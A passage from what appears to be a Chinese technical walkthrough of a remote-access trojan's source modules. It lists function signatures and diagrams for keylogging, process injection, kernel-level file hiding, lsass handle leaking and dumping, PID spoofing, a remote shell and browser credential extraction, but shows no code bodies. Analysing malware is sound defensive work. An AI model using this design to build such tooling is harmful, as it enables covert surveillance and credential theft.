函数：发送特定的令牌，用于标识操作的状态。</li><li><strong><code>void CFileManager::SendNetHood()</code></strong> 函数：发送网络邻居的信息。</li><li><strong><code>void CFileManager::SendSearchFilesList(TCHAR* lpszDirectory)</code></strong> 函数：发送指定目录下的搜索文件列表。</li><li><strong><code>void CFileManager::CreateFolder(LPCTSTR lpszFolder)</code></strong> 函数：创建一个新的文件夹。</li><li><strong><code>void CFileManager::Rename(LPCTSTR lpszNewName)</code></strong> 函数：重命名文件或文件夹。</li><li><strong><code>void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)</code></strong> 函数：将接收到的数据写入本地文件。</li><li><strong><code>void CFileManager::UploadToRemote(LPBYTE lpBuffer)</code></strong> 函数：将文件上传到远程服务器。</li><li><strong><code>void CFileManager::StopTransfer(LPBYTE lpBuffer)</code></strong> 函数：停止文件传输。</li><li><strong><code>void CFileManager::StartZIP()</code></strong> 函数：开始压缩文件的操作。</li><li><strong><code>void CFileManager::StopZIPTheard()</code></strong> 函数：停止压缩线程。</li><li><strong><code>void CFileManager::SendFileInfo(LPCTSTR lpszFileName, LPCTSTR lpszFileType)</code></strong> 函数：发送文件信息。</li><li><strong><code>void CFileManager::encfile(char* filePath)</code></strong> 函数：对指定文件进行加密。</li><li><strong><code>void CFileManager::decryptfile(char* filePath)</code></strong> 函数：对指定文件进行解密。</li><li><strong><code>void CFileManager::FnDelPathFile(TCHAR* filePath)</code></strong> 函数：强制删除指定路径的文件。</li><li><strong><code>void CFileManager::SendFileData(LPBYTE lpBuffer)</code></strong> 函数：发送文件数据。</li><li><strong><code>void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)</code></strong> 函数：创建本地接收文件。</li><li><strong><code>void CFileManager::SetTransferMode(LPBYTE lpBuffer)</code></strong> 函数：设置文件传输模式。</li><li><strong><code>void CFileManager::GetBotId(char* desktopName)</code></strong> 函数：获取机器的Bot ID。</li><li><strong><code>void CFileManager::SendFilesList(TCHAR* lpszDirectory)</code></strong> 函数：发送指定目录下的文件列表。</li><li><strong><code>void CFileManager::SendSearchDate(LPBYTE lpBuffer)</code></strong> 函数：发送搜索日期信息。</li><li><strong><code>void CFileManager::SendRecentFiles()</code></strong> 函数：发送最近使用的文件列表。</li></ol><p>以上是文件中各个功能模块的简要代码及其含义。每个函数的作用都与文件管理相关，涉及文件的创建、删除、传输、压缩等操作。</p><p>MasterEncoder.cpp实现了一个PDF文件的加密和解密功能，使用异或操作和自定义签名来保护文件内容。</p><pre class="mermaid">graph TD;    A[readPDF] --> B[encodePDF]    A --> C[decodePDF]    B --> D[writePDF]    C --> D    D --> E[decode]</pre><p><strong>关键组件介绍：</strong></p><ul><li><strong>readPDF</strong>: 读取PDF文件并返回其内容和大小。</li><li><strong>encodePDF</strong>: 对PDF文件进行加密处理。</li><li><strong>decodePDF</strong>: 对PDF文件进行解密处理。</li><li><strong>writePDF</strong>: 将处理后的数据写入新的PDF文件。</li><li><strong>decode</strong>: 解密数据，返回解密后的内容。</li></ul><ol><li><code>MasterEncoder::readPDF(const string&amp; filepath, long&amp; size)</code>: 函数：读取指定路径的PDF文件，返回文件内容和大小。</li><li><code>MasterEncoder::writePDF(const string&amp; filePath, unsigned char* data, long size)</code>: 函数：将数据写入指定路径的PDF文件。</li><li><code>MasterEncoder::encodePDF(const string&amp; pdfPath, const string&amp; savePath)</code>: 函数：对PDF文件进行加密，并保存到指定路径。</li><li><code>MasterEncoder::decodePDF(const string&amp; pdfPath, const string&amp; savePath)</code>: 函数：对PDF文件进行解密，并保存到指定路径。</li><li><code>MasterEncoder::decode(const string&amp; pdfPath, long&amp; size)</code>: 函数：读取PDF文件并解密，返回解密后的数据。</li></ol><h2 id="查注册表模块"><a href="#查注册表模块" class="headerlink" title="查注册表模块"></a>查注册表模块</h2><p>一个注册表管理器类 <code>CRegeditManager</code>，用于处理与 Windows 注册表的交互，包括创建、删除、修改注册表键值等操作。</p><pre class="mermaid">graph LR;    A[OnReceive] -->|接收命令| B[EnumReg]    A -->|接收命令| C[CreateKey]    A -->|接收命令| D[DeleteKey]    A -->|接收命令| E[Rename]    A -->|接收命令| F[DeleteVal]    A -->|接收命令| G[CreatSTR]    A -->|接收命令| H[CreatDWORD]    A -->|接收命令| I[CreatEXSTR]    B --> J[GetRegInfo]    C --> K[MyCreateKey]    D --> L[MyDeleteKey]    E --> M[WriteValue]    F --> N[DeleteValue]    G --> O[WriteValue]    H --> P[WriteValue]    I --> Q[WriteBuf]</pre><p>关键组件介绍</p><ul><li><strong>OnReceive</strong>: 处理接收到的命令，根据命令类型调用相应的处理函数。</li><li><strong>EnumReg</strong>: 枚举注册表键，获取注册表信息。</li><li><strong>CreateKey</strong>: 创建新的注册表键。</li><li><strong>DeleteKey</strong>: 删除指定的注册表键。</li><li><strong>Rename</strong>: 重命名注册表键。</li><li><strong>DeleteVal</strong>: 删除注册表值。</li><li><strong>CreatSTR</strong>: 创建字符串类型的注册表值。</li><li><strong>CreatDWORD</strong>: 创建 DWORD 类型的注册表值。</li><li><strong>CreatEXSTR</strong>: 创建扩展字符串类型的注册表值。</li></ul><ol><li><code>CRegeditManager::OnReceive(LPBYTE lpBuffer, UINT nSize)</code> 函数：处理接收到的数据，根据不同的命令类型调用相应的处理函数。</li><li><code>CRegeditManager::EnumReg(BYTE bToken, LPBYTE lpBuffer)</code> 函数：枚举注册表键，获取注册表信息并发送回客户端。</li><li><code>CRegeditManager::CreateKey(LPBYTE lpBuffer)</code> 函数：创建新的注册表键。</li><li><code>CRegeditManager::DeleteKey(LPBYTE lpBuffer)</code> 函数：删除指定的注册表键。</li><li><code>CRegeditManager::Rename(char* buf)</code> 函数：重命名注册表键。</li><li><code>CRegeditManager::DeleteVal(char* buf)</code> 函数：删除指定的注册表值。</li><li><code>CRegeditManager::CreatSTR(char* buf)</code> 函数：创建字符串类型的注册表值。</li><li><code>CRegeditManager::CreatDWORD(char* buf)</code> 函数：创建 DWORD 类型的注册表值。</li><li><code>CRegeditManager::CreatEXSTR(char* buf)</code> 函数：创建扩展字符串类型的注册表值。</li><li><code>CRegeditManager::WriteValue(LPCTSTR lpValueName, LPCTSTR lpValue)</code> 函数：写入字符串类型的注册表值。</li><li><code>CRegeditManager::WriteBuf(LPCTSTR lpValueName, LPCTSTR lpValue)</code> 函数：写入扩展字符串类型的注册表值。</li><li><code>CRegeditManager::OpenKey(LPCTSTR lpSubKey)</code> 函数：打开指定的注册表键。</li><li><code>CRegeditManager::DeleteValue(LPCTSTR lpValueName)</code> 函数：删除指定的注册表值。</li><li><code>CRegeditManager::SendError()</code> 函数：发送错误信息给客户端。</li><li><code>CRegeditManager::SendSucceed()</code> 函数：发送成功信息给客户端。</li></ol><h2 id="注入模块"><a href="#注入模块" class="headerlink" title="注入模块"></a>注入模块</h2><h3 id="InjectManager"><a href="#InjectManager" class="headerlink" title="InjectManager"></a>InjectManager</h3><p>一个注入管理器，负责管理进程注入、文件传输和进程信息的获取。</p><pre class="mermaid">graph LR;    A[开始] --> B[接收数据]    B --> C{数据类型}    C -->|TOKEN_HEARTBEAT| D[忽略]    C -->|COMMAND_INJECT_PROCESS| E[发送进程列表]    C -->|COMMAND_INJECT_FILE_INFO| F[创建接收文件]    C -->|COMMAND_INJECT_FILE_DATA| G[写入接收文件]    C -->|COMMAND_INJECT_REMOTEFILE_RUN| H[运行远程文件]    C -->|COMMAND_INJECT_REMOTEFILE_DEL| I[删除文件]    C -->|COMMAND_INJECT_SETDLL| J[设置DLL路径]    C -->|COMMAND_INJECT_MODE| K[注入模式处理]    C -->|其他| L[处理其他命令]    D --> M[结束]    E --> M    F --> M    G --> M    H --> M    I --> M    J --> M    K --> M    L --> M</pre><ul><li><strong>接收数据</strong>：从客户端接收指令。</li><li><strong>数据类型判断</strong>：根据接收到的数据类型决定执行的操作。</li><li><strong>发送进程列表</strong>：获取并发送当前进程列表。</li><li><strong>创建接收文件</strong>：为接收文件创建本地文件。</li><li><strong>写入接收文件</strong>：将接收到的数据写入文件。</li><li><strong>运行远程文件</strong>：执行指定的远程文件。</li><li><strong>删除文件</strong>：删除指定的文件。</li><li><strong>注入模式处理</strong>：根据不同的注入模式执行相应的注入操作。</li></ul><ol><li><code>CInjectManager::CInjectManager(ISocketBase* pClient)</code>：构造函数，初始化注入管理器，设置标志和接收数据。</li><li><code>CInjectManager::~CInjectManager()</code>：析构函数，清理资源，退出BoxedAppSDK。</li><li><code>void CInjectManager::OnReceive(LPBYTE lpBuffer, UINT nSize)</code>：处理接收到的数据，根据不同的命令执行相应的操作。</li><li><code>void CInjectManager::SendProcessList()</code>：获取当前进程列表并发送给客户端。</li><li><code>BOOL CInjectManager::DebugPrivilege(const TCHAR* PName, BOOL bEnable)</code>：调整进程的调试权限。</li><li><code>BOOL CInjectManager::GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser)</code>：获取指定进程的用户名。</li><li><code>BOOL CInjectManager::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)</code>：将DOS路径转换为NT路径。</li><li><code>bool CInjectManager::Is64BitOS()</code>：检查操作系统是否为64位。</li><li><code>bool CInjectManager::Is64BitPorcess(DWORD dwProcessID)</code>：检查指定进程是否为64位。</li><li><code>LPBYTE CInjectManager::getProcessList()</code>：获取当前系统的进程列表。</li><li><code>void CInjectManager::SendError(TCHAR* Terror)</code>：发送错误信息给客户端。</li><li><code>void CInjectManager::CreateLocalRecvFile(LPBYTE lpBuffer)</code>：创建接收文件的准备工作。</li><li><code>void CInjectManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)</code>：将接收到的数据写入本地文件。</li><li><code>void CInjectManager::WriteOk()</code>：确认文件写入成功。</li><li><code>void CInjectManager::WriteDllandSetPath(BOOL isx86, TCHAR* lpBuffer)</code>：写入DLL并设置路径。</li><li><code>void CInjectManager::RunExe(LPBYTE lpBuffer)</code>：运行指定的可执行文件。</li><li><code>void CInjectManager::RunExeuacArg(LPBYTE lpBuffer)</code>：运行带参数的可执行文件。</li><li><code>void CInjectManager::DelFile(LPBYTE lpBuffer)</code>：删除指定的文件。</li><li><code>void CInjectManager::Inject_dll()</code>：执行DLL注入操作。</li><li><code>void CInjectManager::Inject_shellcode()</code>：执行Shellcode注入操作。</li></ol><h3 id="memorymodule"><a href="#memorymodule" class="headerlink" title="memorymodule"></a>memorymodule</h3><p><em>MemoryModule.c</em></p><p>公开模块：<a href="https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c">https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c</a></p><h3 id="注入管理"><a href="#注入管理" class="headerlink" title="注入管理"></a>注入管理</h3><p>该代码实现了一个注入管理器，主要用于通过 TCP 或 UDP 连接到指定的地址和端口，并在连接后执行相应的操作。</p><pre class="mermaid">graph TD;    A[WinMain] --> B[SetUnhandledExceptionFilter]    A --> C["CreateThread(MainThread)"]    C --> D[MainThread]    D --> E["Connect(Socket)"]    E --> F[Run Event Loop]    D --> G[ExitProcess]    A --> H[DllMain]    H --> I[Main]    I --> D    H --> J[run]    J --> D</pre><ul><li><strong>WinMain</strong>: 应用程序的入口点，设置未处理异常过滤器并创建主线程。</li><li><strong>MainThread</strong>: 负责建立网络连接并处理网络通信。</li><li><strong>DllMain</strong>: DLL 的入口点，处理 DLL 的加载和卸载。</li><li><strong>Main</strong>: 用于初始化连接参数并启动主线程。</li><li><strong>run</strong>: 启动主线程以处理网络通信。</li></ul><ol><li><code>DWORD WINAPI MainThread(LPVOID dllMainThread)</code>: 主线程函数，负责初始化网络连接，循环处理网络通信。</li><li><code>int GenerateMiniDump(PEXCEPTION_POINTERS pExceptionPointers)</code>: 生成小型转储文件，用于异常处理和调试。</li><li><code>LONG WINAPI ExceptionFilter(LPEXCEPTION_POINTERS lpExceptionInfo)</code>: 异常过滤器，处理未捕获的异常并生成转储文件。</li><li><code>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR szCmdLine, int iCmdShow)</code>: 应用程序入口点，设置异常处理并启动主线程。</li><li><code>BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</code>: DLL 的入口点，处理 DLL 的加载和卸载。</li><li><code>extern &quot;C&quot; __declspec(dllexport) bool Main(TCHAR * ip, DWORD port, BOOL IsTcp, BOOL RunDllEntryProc)</code>: 用于初始化连接参数并启动主线程。</li><li><code>extern &quot;C&quot; __declspec(dllexport) bool run()</code>: 启动主线程以处理网络通信。</li></ol><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>键盘记录器和剪贴板监控器，能够捕获键盘输入和剪贴板内容，并将其发送到指定的服务器。</p><pre class="mermaid">graph TD;    A[主线程] --> B[键盘记录线程]    A --> C[剪贴板监控线程]    B --> D[获取键盘输入]    C --> E[检查剪贴板变化]    D --> F[发送键盘数据]    E --> G[发送剪贴板数据]</pre><ul><li><strong>主线程</strong>：初始化程序并启动键盘记录和剪贴板监控线程。</li><li><strong>键盘记录线程</strong>：负责捕获键盘输入并将其发送到服务器。</li><li><strong>剪贴板监控线程</strong>：监控剪贴板内容的变化，并在变化时发送数据。</li></ul><ol><li><code>unsigned int __stdcall KeyLogger(LPVOID lparam);</code> 函数：键盘记录线程，捕获键盘输入并发送到服务器。</li><li><code>unsigned int __stdcall ClipboardLogger(LPVOID lparam);</code> 函数：剪贴板监控线程，检查剪贴板内容变化并发送更新。</li><li><code>CKeyboardManager::CKeyboardManager(ISocketBase* pClient);</code> 构造函数：初始化键盘管理器，设置线程和资源。</li><li><code>CKeyboardManager::~CKeyboardManager();</code> 析构函数：清理资源，关闭线程和释放内存。</li><li><code>void CKeyboardManager::SendOnlineDate(TCHAR* p_Buffer);</code> 函数：发送在线数据到服务器。</li><li><code>BOOL CKeyboardManager::IsWindowsFocusChange();</code> 函数：检查当前窗口焦点是否变化，并记录变化。</li><li><code>BOOL CKeyboardManager::IsClipboardChange();</code> 函数：检查剪贴板内容是否变化，并处理变化。</li><li><code>void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize);</code> 函数：处理接收到的命令和数据。</li><li><code>void CKeyboardManager::UpdateLocalClipboard(char* buf, int len);</code> 函数：更新本地剪贴板内容。</li><li><code>void CKeyboardManager::SendErroe(TCHAR* data);</code> 函数：发送错误信息到服务器。</li></ol><h2 id="驱动模块"><a href="#驱动模块" class="headerlink" title="驱动模块"></a>驱动模块</h2><h3 id="内核管理"><a href="#内核管理" class="headerlink" title="内核管理"></a>内核管理</h3><p>内核管理器类 <code>CKernelManager</code>，用于处理与内核相关的命令和状态管理，包括初始化、接收命令、设置状态、注册值操作等。</p><pre class="mermaid">graph LR;    A[CKernelManager] -->|OnReceive| B[COMMAND_KERNEL_INIT]    A -->|OnReceive| C[COMMAND_KERNEL_GETSTATE]    A -->|OnReceive| D[COMMAND_KERNEL_SETSTATE_CONTINUE]    A -->|OnReceive| E[COMMAND_KERNEL_SETSTATE_STOP]    A -->|OnReceive| F[COMMAND_KERNEL_RUNCOMMAND]    A -->|OnReceive| G[COMMAND_KERNEL_DELCOMMAND]    A -->|OnReceive| H[COMMAND_KERNEL_WRITERCOMMAND]    A -->|OnReceive| I[COMMAND_KERNEL_BACKDOOR]    A -->|OnReceive| J[COMMAND_KERNEL_DEL]    A -->|OnReceive| K[COMMAND_KERNEL_INJECT]    A -->|OnReceive| L[COMMAND_KERNEL_SETSTATE_PROCESS]</pre><ul><li><strong>CKernelManager</strong>: 主要类，负责管理内核相关的操作。</li><li><strong>OnReceive</strong>: 处理接收到的命令，根据命令类型调用相应的处理函数。</li><li><strong>各命令处理函数</strong>: 处理不同的内核命令，如初始化、获取状态、设置状态等。</li></ul><ol><li><code>CKernelManager::CKernelManager(ISocketBase* pClient)</code>: 构造函数，初始化内核管理器并设置初始状态。</li><li><code>CKernelManager::~CKernelManager()</code>: 析构函数，清理资源。</li><li><code>void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)</code>: 处理接收到的命令，根据命令类型调用相应的处理逻辑。</li><li><code>void CKernelManager::Initialize()</code>: 初始化内核管理器，设置必要的文件和服务。</li><li><code>void CKernelManager::SetRegvalue(TCHAR* name, TCHAR* val, int nSize)</code>: 设置注册表值。</li><li><code>void CKernelManager::GetState()</code>: 获取当前状态并返回信息。</li><li><code>void CKernelManager::SetState(HidActiveState state)</code>: 设置内核的活动状态。</li><li><code>BOOL CKernelManager::IsWindowsX64()</code>: 检查操作系统是否为64位。</li><li><code>void CKernelManager::SendReturnInfo(BYTE mode, TCHAR* info)</code>: 发送返回信息。</li><li><code>HidRegRootTypes CKernelManager::GetRegType(wstring&amp; path)</code>: 获取注册表路径的类型。</li><li><code>HidContext CKernelManager::GetContext()</code>: 获取当前的上下文。</li><li><code>void CKernelManager::runcommand(int argc, TCHAR* Command)</code>: 执行指定的命令。</li><li><code>void CKernelManager::delcommand(int argc, TCHAR* Command)</code>: 删除指定的命令。</li><li><code>void CKernelManager::writercommand(int argc, TCHAR* Command)</code>: 写入指定的命令。</li><li><code>bool CKernelManager::GetMultiStrValue(const wchar_t* name, std::vector&lt;std::wstring&gt;&amp; strs)</code>: 获取多字符串值。</li><li><code>bool CKernelManager::SetMultiStrValue(const wchar_t* name, const std::vector&lt;std::wstring&gt;&amp; strs)</code>: 设置多字符串值。</li><li><code>int CKernelManager::memfind(const char* mem, const char* str, int sizem, int sizes)</code>: 在内存中查找字符串。</li><li><code>BOOL CKernelManager::SetInternetStatus(bool enable)</code>: 设置互联网状态。</li></ol><h3 id="CloseNet-提权和伪装模块"><a href="#CloseNet-提权和伪装模块" class="headerlink" title="CloseNet 提权和伪装模块"></a>CloseNet 提权和伪装模块</h3><p>一系列与进程和权限管理相关的功能，主要用于在Windows环境中进行进程的伪装、句柄泄露和调试权限的管理。</p><pre class="mermaid">graph LR;    A[EnableDebugPrivilege] --> B[MalSeclogonPPIDSpoofing]    B --> C[FindTokenHandlesInProcess]    B --> D[CreateProcessWithTokenW]    B --> E[CreateProcessWithLogonW]    A --> F[MalSeclogonLeakHandles]    F --> G[FindProcessHandlesInTargetProcess]    F --> H[CreateFileLock]    F --> I[LeakLsassHandleInSeclogonWithRaceCondition]    I --> J[ReplaceNtOpenProcess]    I --> K[RestoreNtOpenProcess]</pre><ul><li><strong>EnableDebugPrivilege</strong>: 启用调试权限，允许后续操作进行更高权限的操作。</li><li><strong>MalSeclogonPPIDSpoofing</strong>: 伪装指定进程的PID，尝试使用伪装的PID创建新进程。</li><li><strong>FindTokenHandlesInProcess</strong>: 查找目标进程中的令牌句柄，以便后续的进程创建。</li><li><strong>CreateProcessWithTokenW</strong>: 使用找到的令牌句柄创建新进程。</li><li><strong>CreateProcessWithLogonW</strong>: 如果令牌句柄不可用，则使用登录凭据创建新进程。</li><li><strong>MalSeclogonLeakHandles</strong>: 泄露目标进程的句柄，进行后续的操作。</li><li><strong>FindProcessHandlesInTargetProcess</strong>: 查找目标进程中的句柄。</li><li><strong>CreateFileLock</strong>: 创建文件锁以防止其他进程访问。</li><li><strong>LeakLsassHandleInSeclogonWithRaceCondition</strong>: 利用竞争条件泄露lsass进程的句柄。</li><li><strong>ReplaceNtOpenProcess</strong>: 替换NtOpenProcess函数以返回泄露的句柄。</li><li><strong>RestoreNtOpenProcess</strong>: 恢复NtOpenProcess函数的原始代码。</li></ul><ol><li><code>BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);</code> 函数：设置指定的权限，允许或禁用特定的系统权限。</li><li><code>void EnableDebugPrivilege(BOOL enforceCheck);</code> 函数：启用调试权限，如果强制检查失败则退出程序。</li><li><code>BOOL EnableImpersonatePrivilege();</code> 函数：启用模拟权限，返回是否成功。</li><li><code>void SpoofPidTeb(DWORD spoofedPid, PDWORD originalPid, PDWORD originalTid);</code> 函数：伪装当前线程的PID和TID。</li><li><code>void RestoreOriginalPidTeb(DWORD originalPid, DWORD originalTid);</code> 函数：恢复原始的PID和TID。</li><li><code>NTSTATUS QueryObjectTypesInfo(__out POBJECT_TYPES_INFORMATION* TypesInfo);</code> 函数：查询对象类型信息。</li><li><code>NTSTATUS GetTypeIndexByName(__in PCUNICODE_STRING TypeName, __out PULONG TypeIndex);</code> 函数：根据类型名称获取对象类型索引。</li><li><code>void FindProcessHandlesInTargetProcess(DWORD targetPid, HANDLE* handlesToLeak, PDWORD handlesToLeakCount);</code> 函数：查找目标进程中的句柄。</li><li><code>void FindTokenHandlesInProcess(DWORD targetPid, HANDLE* tokenHandles, PDWORD tokenHandlesLen);</code> 函数：查找目标进程中的令牌句柄。</li><li><code>void MalSeclogonPPIDSpoofing(int pid, wchar_t* cmdline);</code> 函数：伪装指定PID并尝试创建新进程。</li><li><code>BOOL FileExists(LPCTSTR szPath);</code> 函数：检查指定路径的文件是否存在。</li><li><code>void MalSeclogonLeakHandles(int lsassPid, wchar_t* dumpPath);</code> 函数：泄露lsass进程的句柄并创建转储文件。</li><li><code>void CreateFileLock(HANDLE hFile, LPOVERLAPPED overlapped);</code> 函数：创建文件锁以防止其他进程访问。</li><li><code>DWORD WINAPI ThreadSeclogonLock(LPVOID lpParam);</code> 函数：线程函数，用于执行伪装操作。</li><li><code>void LeakLsassHandleInSeclogonWithRaceCondition(DWORD lsassPid);</code> 函数：利用竞争条件泄露lsass进程的句柄。</li><li><code>void ReplaceNtOpenProcess(HANDLE leakedHandle, char* oldCode, int* oldCodeSize);</code> 函数：替换NtOpenProcess以返回泄露的句柄。</li><li><code>void RestoreNtOpenProcess(char* oldCode, int oldCodeSize);</code> 函数：恢复NtOpenProcess的原始代码。</li><li><code>void MalSeclogonDumpLsassFromLeakedHandles(int lsassPid, wchar_t* dumpPath, BOOL useLsassClone);</code> 函数：从泄露的句柄中转储lsass进程。</li><li><code>DWORD GetPidUsingFilePath(wchar_t* processBinaryPath);</code> 函数：根据进程的二进制路径获取进程ID。</li></ol><h3 id="隐藏文件-HiddenLib"><a href="#隐藏文件-HiddenLib" class="headerlink" title="隐藏文件  HiddenLib"></a>隐藏文件  HiddenLib</h3><p>该代码实现了一个隐藏库，提供了对设备的控制和管理功能，包括隐藏文件、注册表项和进程等。</p><pre class="mermaid">graph TD;    A[Hid_Initialize] --> B[Hid_InitializeWithNoConnection]    B --> C[GetProcAddress]    A --> D[CreateFileW]    D --> E[Hid_Destroy]    E --> F[CloseHandle]    A --> G[SendIoctl_HideObjectPacket]    G --> H[DeviceIoControl]    H --> I[SendIoctl_UnhideObjectPacket]    I --> H</pre><ul><li><strong>Hid_Initialize</strong>: 初始化 HID 设备，确保所需的函数指针被正确加载。</li><li><strong>Hid_Destroy</strong>: 释放 HID 设备的资源。</li><li><strong>SendIoctl_HideObjectPacket</strong>: 发送 IOCTL 命令以隐藏对象。</li><li><strong>DeviceIoControl</strong>: 与设备驱动程序进行通信的核心函数。</li></ul><ol><li><code>HidStatus _API Hid_InitializeWithNoConnection();</code> 函数：初始化 HID 设备而不建立连接，加载必要的函数指针。</li><li><code>HidStatus _API Hid_Initialize(PHidContext pcontext, const wchar_t* deviceName);</code> 函数：初始化 HID 设备并打开设备文件。</li><li><code>void _API Hid_Destroy(HidContext context);</code> 函数：释放 HID 设备的资源。</li><li><code>bool ConvertToNtPath(const wchar_t* path, wchar_t* normalized, size_t normalizedLen);</code> 函数：将 DOS 路径转换为 NT 路径。</li><li><code>bool NormalizeRegistryPath(HidRegRootTypes root, const wchar_t* key, wchar_t* normalized, size_t normalizedLen);</code> 函数：标准化注册表路径。</li><li><code>HidStatus AllocNormalizedPath(const wchar_t* path, wchar_t** normalized);</code> 函数：分配标准化路径的内存。</li><li><code>HidStatus SendIoctl_HideObjectPacket(PHidContextInternal context, const wchar_t* path, unsigned short type, HidObjId* objId);</code> 函数：发送 IOCTL 命令以隐藏对象。</li><li><code>HidStatus SendIoctl_UnhideObjectPacket(PHidContextInternal context, unsigned short type, HidObjId objId);</code> 函数：发送 IOCTL 命令以取消隐藏对象。</li><li><code>HidStatus SendIoctl_AddPsObjectPacket(PHidContextInternal context, const wchar_t* path, unsigned short type, HidPsInheritTypes inheritType, bool applyForProcess, HidObjId* objId);</code> 函数：添加进程对象。</li><li><code>HidStatus _API Hid_SetState(HidContext context, HidActiveState state);</code> 函数：设置 HID 设备的状态。</li><li><code>HidStatus _API Hid_GetState(HidContext context, HidActiveState* pstate);</code> 函数：获取 HID 设备的状态。</li><li><code>HidStatus _API Hid_AddHiddenFile(HidContext context, const wchar_t* filePath, HidObjId* objId);</code> 函数：添加隐藏文件。</li><li><code>HidStatus _API Hid_RemoveHiddenFile(HidContext context, HidObjId objId);</code> 函数：移除隐藏文件。</li><li><code>HidStatus _API Hid_NormalizeFilePath(const wchar_t* filePath, wchar_t* normalized, size_t normalizedLen);</code> 函数：标准化文件路径。</li></ol><h2 id="远程shell管理-shellmanager"><a href="#远程shell管理-shellmanager" class="headerlink" title="远程shell管理 shellmanager"></a>远程shell管理 shellmanager</h2><p> <code>CShellManager</code> 类，负责管理与外部命令行进程的交互，包括创建管道、启动进程、读取输出和监控进程状态。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><pre class="mermaid">graph TD;    A[CShellManager] -->|创建| B[管道]    A -->|启动| C[cmd.exe]    A -->|读取| D[输出]    A -->|监控| E[进程状态]    D -->|发送| F[客户端]</pre><ul><li><strong>CShellManager</strong>: 管理与命令行进程的交互。</li><li><strong>管道</strong>: 用于进程间通信。</li><li><strong>cmd.exe</strong>: 被启动的命令行进程。</li><li><strong>输出</strong>: 从命令行进程读取的数据。</li><li><strong>进程状态</strong>: 监控命令行进程的运行状态。</li></ul><ol><li><code>CShellManager::CShellManager(ISocketBase* pClient)</code>: 构造函数，初始化管道和启动命令行进程。</li><li><code>CShellManager::~CShellManager()</code>: 析构函数，清理资源，终止线程和进程。</li><li><code>void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)</code>: 处理接收到的数据，发送到命令行进程。</li><li><code>unsigned CShellManager::ReadPipeThread(LPVOID lparam)</code>: 读取管道数据的线程函数，处理命令行进程的输出。</li><li><code>unsigned CShellManager::MonitorThread(LPVOID lparam)</code>: 监控命令行进程和读取线程的状态，确保它们正常运行。</li></ol><h2 id="远控CC信息交互"><a href="#远控CC信息交互" class="headerlink" title="远控CC信息交互"></a>远控CC信息交互</h2><p>聊天管理器，负责处理聊天窗口的创建、消息发送、键盘钩子设置以及与系统交互的功能。</p><pre class="mermaid">graph TD;    A[CChatManager] -->|创建| B[ChatDialogProc]    A -->|发送消息| C[OnReceive]    A -->|设置钩子| D[SetHook]    A -->|解除钩子| E[UnSetHook]    B -->|处理消息| F[WM_COMMAND]    F -->|发送按钮| G[SendMessage]    F -->|关闭按钮| H[WM_CLOSE]</pre><ul><li><strong>CChatManager</strong>: 聊天管理器类，负责聊天窗口的管理和消息处理。</li><li><strong>ChatDialogProc</strong>: 聊天对话框的消息处理函数，处理用户输入和按钮点击事件。</li><li><strong>OnReceive</strong>: 处理接收到的消息并更新聊天记录。</li><li><strong>SetHook</strong>: 设置键盘钩子以拦截特定的键盘事件。</li><li><strong>UnSetHook</strong>: 解除键盘钩子，恢复正常的键盘操作。</li></ul><ol><li><code>CChatManager::CChatManager(ISocketBase* pClient);</code> 函数：构造函数，初始化聊天管理器并启动消息循环。</li><li><code>CChatManager::~CChatManager();</code> 函数：析构函数，清理资源并解除钩子。</li><li><code>DWORD WINAPI CChatManager::MessageLoopProc(LPVOID lParam);</code> 函数：消息循环处理函数，创建聊天对话框并处理消息。</li><li><code>INT_PTR CALLBACK CChatManager::ChatDialogProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);</code> 函数：聊天对话框的回调函数，处理对话框的消息。</li><li><code>void CChatManager::OnReceive(LPBYTE lpBuffer, UINT nSize);</code> 函数：处理接收到的聊天消息并更新聊天记录。</li><li><code>void SetHook();</code> 函数：设置键盘钩子以拦截特定的键盘事件。</li><li><code>void UnSetHook();</code> 函数：解除键盘钩子，恢复正常的键盘操作。</li><li><code>DWORD GetWinlogonPid();</code> 函数：获取系统winlogon进程的PID。</li><li><code>LRESULT CALLBACK KeyBoardProc(int code, WPARAM wParam, LPARAM lParam);</code> 函数：键盘钩子的回调函数，处理键盘事件。</li></ol><h2 id="解密数据模块"><a href="#解密数据模块" class="headerlink" title="解密数据模块"></a>解密数据模块</h2><h3 id="解密浏览器数据"><a href="#解密浏览器数据" class="headerlink" title="解密浏览器数据"></a>解密浏览器数据</h3><p>该代码文件 <code>GetBrowserInfo.cpp</code> 主要用于获取不同浏览器（如 Chrome、QQ、Edge 和 Speed 360）的用户数据，包括登录信息和 cookies。它通过访问特定的文件路径和数据库来提取这些信息。</p><pre class="mermaid">graph LR;    A[GetBrowserInfo] --> B[GetFullPathFromRelativeToBro]    A --> C[GetCookies]    A --> D[GetAllCookies]    A --> E[GetAllData]    A --> F[GetData]    A --> G[Find360SPLoginDB]    A --> H[GetMasterKey]    A --> I[ParseEncryptedKey]</pre><ul><li><strong>GetBrowserInfo</strong>: 主类，负责初始化和管理浏览器信息的获取。</li><li><strong>GetFullPathFromRelativeToBro</strong>: 生成相对于浏览器目录的完整路径。</li><li><strong>GetCookies</strong>: 从浏览器的 cookies 数据库中提取 cookies 信息。</li><li><strong>GetAllCookies</strong>: 获取所有 cookies 的入口函数。</li><li><strong>GetAllData</strong>: 获取所有用户数据的入口函数。</li><li><strong>GetData</strong>: 从登录数据数据库中提取用户登录信息。</li><li><strong>Find360SPLoginDB</strong>: 查找 360 浏览器的登录数据库。</li><li><strong>GetMasterKey</strong>: 获取解密所需的主密钥。</li><li><strong>ParseEncryptedKey</strong>: 